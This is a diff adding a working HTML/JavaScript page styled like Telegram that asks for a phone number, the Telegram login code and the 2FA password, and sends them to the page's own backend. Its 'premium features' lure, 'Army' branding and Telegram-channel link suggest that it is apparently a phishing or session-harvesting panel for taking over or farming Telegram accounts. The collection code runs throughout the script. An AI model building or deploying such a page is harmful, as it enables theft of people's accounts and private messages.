@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Add Account • Auto‑Verify</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #0e1621;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 450px;
+    }
+
+    .login-card {
+      background: #17212b;
+      border-radius: 28px;
+      padding: 32px 24px;
+      border: 1px solid #2b3945;
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5);
+      transition: all 0.2s ease;
+    }
+
+    .header-bar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .back-button {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #242f3d;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #8e9fad;
+      font-size: 1.3rem;
+      border: none;
+      text-decoration: none;
+      transition: 0.2s;
+    }
+
+    .back-button:hover {
+      background: #2b3945;
+      color: white;
+    }
+
+    .header-title {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #fff;
+      flex: 1;
+    }
+
+    .server-badge {
+      background: #2b5278;
+      color: #6ab2f2;
+      font-size: 0.7rem;
+      padding: 4px 12px;
+      border-radius: 30px;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    .step-indicator {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .step-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #2b3945;
+      transition: 0.3s;
+    }
+
+    .step-dot.active {
+      background: #4c9ce0;
+      width: 24px;
+      border-radius: 4px;
+    }
+
+    .step-dot.done {
+      background: #4c9e4c;
+    }
+
+    .step-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+
+    .step-description {
+      color: #8e9fad;
+      font-size: 0.9rem;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .input-wrapper {
+      background: #242f3d;
+      border: 1px solid #2b3945;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+      margin-bottom: 20px;
+      transition: 0.2s;
+    }
+
+    .input-wrapper:focus-within {
+      border-color: #4c9ce0;
+      box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
+    }
+
+    .input-prefix {
+      padding: 14px 0 14px 18px;
+      color: #4c9ce0;
+      font-weight: 700;
+      font-size: 1rem;
+      background: #1e2a36;
+      border-right: 1px solid #2b3945;
+      min-width: 38px;
+      text-align: center;
+    }
+
+    .form-input {
+      flex: 1;
+      padding: 14px 16px;
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    .form-input::placeholder {
+      color: #5d6f7e;
+    }
+
+    .password-input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #242f3d;
+      border: 1px solid #2b3945;
+      border-radius: 16px;
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+      margin-bottom: 20px;
+      transition: 0.2s;
+    }
+
+    .password-input:focus {
+      border-color: #4c9ce0;
+      box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
+    }
+
+    /* CODE BOXES */
+    .code-container {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 24px 0 10px;
+      cursor: text;
+      flex-wrap: wrap;
+    }
+
+    .code-box {
+      width: 55px;
+      height: 65px;
+      background: #242f3d;
+      border: 2px solid #2b3945;
+      border-radius: 16px;
+      color: #fff;
+      font-size: 1.9rem;
+      font-weight: 700;
+      text-align: center;
+      line-height: 61px;
+      transition: all 0.15s ease;
+      user-select: none;
+      position: relative;
+    }
+
+    .code-box.filled {
+      border-color: #4c9ce0;
+      background: #2b5278;
+      box-shadow: 0 0 12px rgba(76, 156, 224, 0.25);
+    }
+
+    .code-box.active {
+      border-color: #6ab2f2;
+      box-shadow: 0 0 16px rgba(76, 156, 224, 0.5);
+    }
+
+    .code-box.error {
+      border-color: #e04c4c;
+      background: #4a1e1e;
+      box-shadow: 0 0 12px rgba(224, 76, 76, 0.4);
+      animation: shake 0.4s ease;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+
+    .hidden-input {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+      pointer-events: none;
+    }
+
+    .code-hint {
+      text-align: center;
+      color: #5d6f7e;
+      font-size: 0.8rem;
+      margin: 8px 0 18px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px 18px;
+      border: none;
+      border-radius: 16px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .btn-primary {
+      background: #4c9ce0;
+      color: white;
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      background: #6ab2f2;
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .btn-secondary {
+      background: #242f3d;
+      color: #6ab2f2;
+      border: 1px solid #2b3945;
+    }
+
+    .btn-secondary:hover {
+      background: #2b3945;
+    }
+
+    .clear-code-btn {
+      background: none;
+      border: none;
+      color: #8e9fad;
+      font-size: 0.8rem;
+      text-decoration: underline;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 6px;
+      padding: 6px;
+    }
+
+    .clear-code-btn:hover {
+      color: #ff6b6b;
+    }
+
+    .error-message, .success-message {
+      padding: 12px 16px;
+      border-radius: 14px;
+      margin-bottom: 18px;
+      font-size: 0.85rem;
+      display: none;
+      font-weight: 500;
+    }
+
+    .error-message {
+      background: #4a1e1e;
+      color: #ff6b6b;
+      border-left: 3px solid #e04c4c;
+    }
+
+    .success-message {
+      background: #1e4a2b;
+      color: #4c9e4c;
+      border-left: 3px solid #4c9e4c;
+    }
+
+    .error-message.show, .success-message.show {
+      display: block;
+    }
+
+    .loading-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .success-icon {
+      font-size: 4rem;
+      text-align: center;
+      margin: 15px 0;
+    }
+
+    .footer-text {
+      text-align: center;
+      color: #5d6f7e;
+      font-size: 0.8rem;
+      margin-top: 15px;
+    }
+
+    .attempt-counter {
+      text-align: center;
+      font-size: 0.8rem;
+      margin-top: 12px;
+      color: #ffaa00;
+    }
+
+    @media (max-width: 450px) {
+      .code-box {
+        width: 48px;
+        height: 56px;
+        font-size: 1.6rem;
+        line-height: 52px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="login-container">
+  <div class="login-card">
+    <!-- PAGE 1: PHONE -->
+    <div id="page1">
+      <div class="header-bar">
+        <span class="back-button" id="backToDashboardBtn1">←</span>
+        <div class="header-title">Add Account</div>
+        <div class="server-badge" id="serverBadge">⚡ Server</div>
+      </div>
+      <div class="step-indicator">
+        <div class="step-dot active" id="dot1"></div>
+        <div class="step-dot" id="dot2"></div>
+        <div class="step-dot" id="dot3"></div>
+      </div>
+      <div class="step-title">📱 Phone Number</div>
+      <div class="step-description">Enter phone number with country code to receive verification code.</div>
+      <div class="error-message" id="error1"></div>
+      <div class="success-message" id="success1"></div>
+      <div class="input-wrapper">
+        <span class="input-prefix">+</span>
+        <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" autocomplete="off">
+      </div>
+      <button class="btn btn-primary" id="sendCodeBtn">📨 Send Code</button>
+      <div class="footer-text">Account will be linked to premium features</div>
+    </div>
+
+    <!-- PAGE 2: VERIFY CODE (AUTO‑VERIFY) -->
+    <div id="page2" style="display: none;">
+      <div class="header-bar">
+        <span class="back-button" id="backToPhoneBtn">←</span>
+        <div class="header-title">Verify Code</div>
+        <div class="server-badge" id="serverBadge2">⚡ Server</div>
+      </div>
+      <div class="step-indicator">
+        <div class="step-dot done" id="dot1b"></div>
+        <div class="step-dot active" id="dot2b"></div>
+        <div class="step-dot" id="dot3b"></div>
+      </div>
+      <div class="step-title">🔐 Code</div>
+      <div class="step-description" id="codeDescription">Enter the 5‑digit code from Telegram.</div>
+      <div class="error-message" id="error2"></div>
+      <div class="success-message" id="success2"></div>
+
+      <!-- Hidden real input -->
+      <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+
+      <div class="code-container" id="codeBoxesContainer">
+        <div class="code-box" id="box1" data-index="0">-</div>
+        <div class="code-box" id="box2" data-index="1">-</div>
+        <div class="code-box" id="box3" data-index="2">-</div>
+        <div class="code-box" id="box4" data-index="3">-</div>
+        <div class="code-box" id="box5" data-index="4">-</div>
+      </div>
+      <div class="code-hint">Tap boxes or type · Backspace to edit</div>
+
+      <div id="passwordGroup" style="display: none;">
+        <input type="password" class="password-input" id="password" placeholder="2FA password" autocomplete="off">
+      </div>
+
+      <button class="btn btn-primary" id="verifyBtn">✅ Verify & Add Account</button>
+      <button class="btn btn-secondary" id="clearCodeManualBtn">🗑️ Clear Code</button>
+      <button class="btn btn-secondary" id="backToPhoneFromCodeBtn">← Change Phone Number</button>
+      <div class="attempt-counter" id="attemptCounter"></div>
+    </div>
+
+    <!-- PAGE 3: SUCCESS -->
+    <div id="page3" style="display: none;">
+      <div class="header-bar">
+        <div class="header-title">Success ✅</div>
+      </div>
+      <div class="step-indicator">
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+      </div>
+      <div class="success-icon">🎉</div>
+      <div class="step-title" style="text-align: center;">Account Added!</div>
+      <div class="step-description" id="successAccountInfo" style="text-align: center;"></div>
+      <button class="btn btn-primary" id="goToAutoAddBtn">⚙️ dev Settings</button>
+      <button class="btn btn-secondary" id="addAnotherBtn">➕ Add Another</button>
+      <button class="btn btn-secondary" id="goToDashboardBtn">📱 Dashboard</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- STATE -----
+    let currentSessionId = null;
+    let currentPhone = '';
+    let serverName = 'Server1';
+    let codeAttempts = 0;
+    let passwordAttempts = 0;
+    const MAX_ATTEMPTS = 5;
+
+    // DOM elements
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const page3 = document.getElementById('page3');
+    const phoneInput = document.getElementById('phone');
+    const hiddenInput = document.getElementById('hiddenCodeInput');
+    const boxes = [
+      document.getElementById('box1'),
+      document.getElementById('box2'),
+      document.getElementById('box3'),
+      document.getElementById('box4'),
+      document.getElementById('box5')
+    ];
+    const passwordGroup = document.getElementById('passwordGroup');
+    const passwordInput = document.getElementById('password');
+    const error1 = document.getElementById('error1');
+    const error2 = document.getElementById('error2');
+    const success2 = document.getElementById('success2');
+    const attemptCounter = document.getElementById('attemptCounter');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const sendCodeBtn = document.getElementById('sendCodeBtn');
+
+    // ----- UTILS -----
+    function showError(el, msg) {
+      if (!el) return;
+      el.textContent = msg;
+      el.classList.add('show');
+      setTimeout(() => { if (el.textContent === msg) el.classList.remove('show'); }, 6000);
+    }
+
+    function hideError(el) {
+      if (el) el.classList.remove('show');
+    }
+
+    function showSuccess(el, msg) {
+      if (!el) return;
+      el.textContent = msg;
+      el.classList.add('show');
+      setTimeout(() => el.classList.remove('show'), 4000);
+    }
+
+    function setLoading(btn, loading, originalText) {
+      if (loading) {
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loading-spinner"></span> Please wait...';
+      } else {
+        btn.disabled = false;
+        btn.innerHTML = originalText || btn.getAttribute('data-original') || 'Submit';
+      }
+    }
+
+    function updateCodeBoxes() {
+      let raw = hiddenInput.value.replace(/[^0-9]/g, '');
+      if (raw.length > 5) raw = raw.slice(0, 5);
+      hiddenInput.value = raw;
+      
+      for (let i = 0; i < 5; i++) {
+        const box = boxes[i];
+        box.classList.remove('filled', 'active', 'error');
+        if (i < raw.length) {
+          box.textContent = raw[i];
+          box.classList.add('filled');
+        } else {
+          box.textContent = '-';
+        }
+      }
+      if (raw.length < 5) {
+        boxes[raw.length].classList.add('active');
+      }
+      hideError(error2);
+    }
+
+    function clearCodeInput() {
+      hiddenInput.value = '';
+      updateCodeBoxes();
+      focusCodeInput();
+      hideError(error2);
+      codeAttempts = 0;
+      passwordAttempts = 0;
+      updateAttemptDisplay();
+    }
+
+    function focusCodeInput() {
+      hiddenInput.focus();
+      updateCodeBoxes();
+    }
+
+    function shakeCodeBoxes() {
+      boxes.forEach(b => b.classList.add('error'));
+      setTimeout(() => boxes.forEach(b => b.classList.remove('error')), 500);
+    }
+
+    function updateAttemptDisplay() {
+      const remaining = MAX_ATTEMPTS - Math.max(codeAttempts, passwordAttempts);
+      if (codeAttempts === 0 && passwordAttempts === 0) {
+        attemptCounter.textContent = '';
+        return;
+      }
+      if (remaining <= 0) {
+        attemptCounter.textContent = '❌ No attempts left. Session expired.';
+        attemptCounter.style.color = '#ff6b6b';
+      } else if (remaining <= 2) {
+        attemptCounter.textContent = `⚠️ ${remaining} attempt${remaining>1?'s':''} left`;
+        attemptCounter.style.color = '#ffaa00';
+      } else {
+        attemptCounter.textContent = `${remaining} attempts remaining`;
+        attemptCounter.style.color = '#8e9fad';
+      }
+    }
+
+    // ----- AUTO VERIFY TRIGGER (when code length reaches 5) -----
+    function onCodeInputChange() {
+      updateCodeBoxes();
+      const code = hiddenInput.value.replace(/[^0-9]/g, '');
+      // AUTO VERIFY when exactly 5 digits entered (no button press needed)
+      if (code.length === 5) {
+        // Small delay to let UI update, then auto-submit
+        setTimeout(() => {
+          // Only if still on page2 and code still 5
+          if (page2.style.display !== 'none' && hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
+            performVerification();
+          }
+        }, 80);
+      }
+    }
+
+    // ----- VERIFICATION LOGIC (called by auto or button) -----
+    async function performVerification() {
+      const code = hiddenInput.value.replace(/[^0-9]/g, '');
+      if (code.length !== 5) {
+        showError(error2, 'Please enter the complete 5‑digit code.');
+        shakeCodeBoxes();
+        return;
+      }
+
+      const needPassword = passwordGroup.style.display === 'block';
+      const password = passwordInput.value;
+      if (needPassword && !password) {
+        showError(error2, '2FA password required.');
+        passwordInput.focus();
+        return;
+      }
+
+      if (!currentSessionId) {
+        showError(error2, 'Session missing. Go back and request a new code.');
+        return;
+      }
+
+      setLoading(verifyBtn, true, '✅ Verify & Add Account');
+      hideError(error2);
+
+      try {
+        const res = await fetch('/api/verify-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            code: code,
+            session_id: currentSessionId,
+            password: password
+          })
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+          // SUCCESS -> move to page 3
+          page2.style.display = 'none';
+          page3.style.display = 'block';
+          document.getElementById('successAccountInfo').innerHTML = 
+            `<strong>${data.account?.name || 'User'}</strong><br>📞 ${currentPhone}`;
+          showSuccess(document.getElementById('success2'), 'Account verified!');
+        } 
+        else if (data.need_password) {
+          // 2FA required
+          passwordGroup.style.display = 'block';
+          passwordInput.value = '';
+          passwordInput.focus();
+          showError(error2, '🔐 This account has 2FA. Enter your password.');
+        }
+        else {
+          // WRONG CODE (or other error) -> clear code & try again (AUTO CLEAR)
+          const errorMsg = data.error || 'Invalid code.';
+          
+          if (errorMsg.toLowerCase().includes('password')) {
+            passwordAttempts++;
+            updateAttemptDisplay();
+            passwordInput.value = '';
+            passwordInput.focus();
+            showError(error2, `${errorMsg} (${MAX_ATTEMPTS - passwordAttempts} left)`);
+            if (passwordAttempts >= MAX_ATTEMPTS) {
+              showError(error2, 'Too many password attempts. Returning to phone.');
+              setTimeout(() => backToPhonePage(), 2000);
+            }
+          } else {
+            // Code error -> clear code completely and let user try again
+            codeAttempts++;
+            updateAttemptDisplay();
+            showError(error2, `${errorMsg} Code cleared. Try again.`);
+            shakeCodeBoxes();
+            
+            // *** AUTO CLEAR CODE (as requested) ***
+            hiddenInput.value = '';
+            updateCodeBoxes();
+            focusCodeInput();
+            
+            if (codeAttempts >= MAX_ATTEMPTS) {
+              showError(error2, 'Too many wrong codes. Please request a new one.');
+              setTimeout(() => backToPhonePage(), 2200);
+            }
+          }
+        }
+      } catch (err) {
+        showError(error2, 'Network error. Please try again.');
+        // Still clear code on network error to allow retry
+        hiddenInput.value = '';
+        updateCodeBoxes();
+        focusCodeInput();
+      } finally {
+        setLoading(verifyBtn, false, '✅ Verify & Add Account');
+      }
+    }
+
+    // ----- SEND CODE (PAGE 1) -----
+    async function sendCodeHandler() {
+      let phone = phoneInput.value.trim().replace(/\s+/g, '');
+      if (!phone) {
+        showError(error1, 'Enter phone number');
+        return;
+      }
+      phone = phone.replace(/[^0-9+]/g, '');
+      if (!phone.startsWith('+')) phone = '+' + phone;
+
+      setLoading(sendCodeBtn, true, '📨 Send Code');
+      hideError(error1);
+
+      try {
+        const res = await fetch('/api/add-account', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: phone })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          currentSessionId = data.session_id;
+          currentPhone = phone;
+          // Switch to page 2
+          page1.style.display = 'none';
+          page2.style.display = 'block';
+          passwordGroup.style.display = 'none';
+          passwordInput.value = '';
+          clearCodeInput();
+          codeAttempts = 0;
+          passwordAttempts = 0;
+          updateAttemptDisplay();
+          document.getElementById('codeDescription').textContent = 'Enter the 5‑digit code sent to Telegram.';
+          focusCodeInput();
+          showSuccess(success2, 'Code sent! Check Telegram.');
+        } else {
+          showError(error1, data.error || 'Failed to send code.');
+        }
+      } catch (e) {
+        showError(error1, 'Connection error.');
+      } finally {
+        setLoading(sendCodeBtn, false, '📨 Send Code');
+      }
+    }
+
+    function backToPhonePage() {
+      page2.style.display = 'none';
+      page3.style.display = 'none';
+      page1.style.display = 'block';
+      passwordGroup.style.display = 'none';
+      passwordInput.value = '';
+      hiddenInput.value = '';
+      updateCodeBoxes();
+      currentSessionId = null;
+      codeAttempts = 0;
+      passwordAttempts = 0;
+      updateAttemptDisplay();
+      phoneInput.focus();
+    }
+
+    function showSuccessPage() {
+      page1.style.display = 'none';
+      page2.style.display = 'none';
+      page3.style.display = 'block';
+    }
+
+    // ----- EVENT LISTENERS -----
+    hiddenInput.addEventListener('input', onCodeInputChange);
+
+    hiddenInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace') {
+        // Let normal backspace work, update boxes after.
+        setTimeout(updateCodeBoxes, 10);
+      } else if (e.key === 'Delete') {
+        e.preventDefault();
+        clearCodeInput();
+      } else if (e.key === 'Enter') {
+        e.preventDefault();
+        performVerification();
+      }
+    });
+
+    hiddenInput.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = paste.replace(/[^0-9]/g, '').slice(0, 5);
+      hiddenInput.value = digits;
+      onCodeInputChange();
+    });
+
+    // Click on boxes to position cursor
+    boxes.forEach(box => {
+      box.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const idx = parseInt(box.getAttribute('data-index'), 10);
+        const current = hiddenInput.value.replace(/[^0-9]/g, '');
+        if (idx < current.length) {
+          hiddenInput.value = current.slice(0, idx + 1);
+        } else {
+          hiddenInput.value = current.slice(0, idx);
+        }
+        updateCodeBoxes();
+        hiddenInput.focus();
+      });
+    });
+
+    document.getElementById('codeBoxesContainer').addEventListener('click', focusCodeInput);
+
+    // Buttons
+    document.getElementById('sendCodeBtn').addEventListener('click', sendCodeHandler);
+    document.getElementById('verifyBtn').addEventListener('click', performVerification);
+    document.getElementById('clearCodeManualBtn').addEventListener('click', clearCodeInput);
+
+    document.getElementById('backToPhoneBtn').addEventListener('click', backToPhonePage);
+    document.getElementById('backToPhoneFromCodeBtn').addEventListener('click', backToPhonePage);
+    document.getElementById('backToDashboardBtn1').addEventListener('click', () => {
+      window.location.href = '/dashboard';
+    });
+
+    // Page 3 buttons
+    document.getElementById('goToAutoAddBtn').addEventListener('click', () => {
+      window.location.href = 'https://t.me/abe_army';
+    });
+    document.getElementById('addAnotherBtn').addEventListener('click', () => {
+      backToPhonePage();
+      page3.style.display = 'none';
+    });
+    document.getElementById('goToDashboardBtn').addEventListener('click', () => {
+      window.location.href = '/dashboard';
+    });
+
+    phoneInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendCodeHandler();
+    });
+    passwordInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') performVerification();
+    });
+
+    // Initial server name mock
+    window.addEventListener('load', () => {
+      document.getElementById('serverBadge').textContent = '⚡ Army';
+      document.getElementById('serverBadge2').textContent = '⚡ Army';
+      phoneInput.focus();
+      // Store original button texts
+      document.querySelectorAll('.btn-primary').forEach(b => {
+        b.setAttribute('data-original', b.innerHTML);
+      });
+    });
+
+    // Observe page2 display to auto-focus
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach(m => {
+        if (m.target === page2 && page2.style.display === 'block') {
+          setTimeout(focusCodeInput, 200);
+        }
+      });
+    });
+    observer.observe(page2, { attributes: true, attributeFilter: ['style'] });
+
+  })();
+</script>
+</body>
+</html>
